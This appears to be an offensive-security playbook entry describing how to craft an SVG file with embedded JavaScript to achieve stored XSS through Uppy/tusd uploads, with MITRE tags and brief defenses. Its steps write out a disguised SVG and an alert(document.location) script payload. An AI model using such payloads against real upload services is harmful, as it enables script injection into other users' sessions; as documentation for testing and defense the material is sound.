---
tags:
  - xss
  - payload
  - svg
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/alert-document-location]]'
platforms:
  - Web
techniques:
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 89d2e380-7e33-4ecf-b887-83b0276e8d8e
created_at: '2025-12-14T03:16:14.085Z'
updated_at: '2025-12-14T03:16:14.085Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Create-Malicious-SVG-with-Embedded-JavaScript

## Summary

This procedure creates a crafted SVG file containing embedded JavaScript that executes when rendered, exploiting the lack of sanitization in Uppy's file handling to demonstrate stored XSS.

## Description

SVG files can include script tags, which browsers execute during rendering. By embedding a simple alert or more advanced payload, an attacker can achieve code execution upon file view. The file includes a legitimate polygon for visual validity, masking the malicious intent. This payload persists as the file is stored and served by the tusd endpoint.

## Requirements

1. Text editor (e.g., VS Code, Notepad++)
2. Basic knowledge of SVG and JavaScript syntax
3. No runtime dependencies

## Defense

Defensive measures and detection strategies:

- Sanitize SVG uploads by stripping script tags and foreignObject elements
- Use Content-Security-Policy (CSP) to block inline scripts
- Validate file contents with libraries like DOMPurify before storage

## Objectives

1. Generate a functional malicious SVG payload
2. Ensure the file renders without errors while executing JS
3. Prepare for upload to trigger XSS

## Instructions

### Step 1: Write the SVG Structure

**Context**: Create the base SVG with a visual element to appear benign.

**Command** (Manual file creation):
```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <polygon points="100,10 40,198 190,78 10,78 160,198" fill="red"/>
```

> Defines a red polygon shape. Expected output: Valid XML structure.

### Step 2: Embed JavaScript Payload

**Context**: Insert the script tag with XSS code to execute on render.

**Command** ([[commands/alert-document-location]]):
```javascript
<script>alert(document.location);</script>
```

> Adds the alert script inside the SVG. Expected output: When saved and opened, alert shows current URL.

### Step 3: Save the File

**Context**: Export as .svg for upload compatibility.

Save the complete content as `malicious.svg`.

> Ensures file type is recognized by Uppy. Expected output: File ready for upload.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/alert-document-location]]

## Tools Used


## Tags

- xss
- payload
- svg
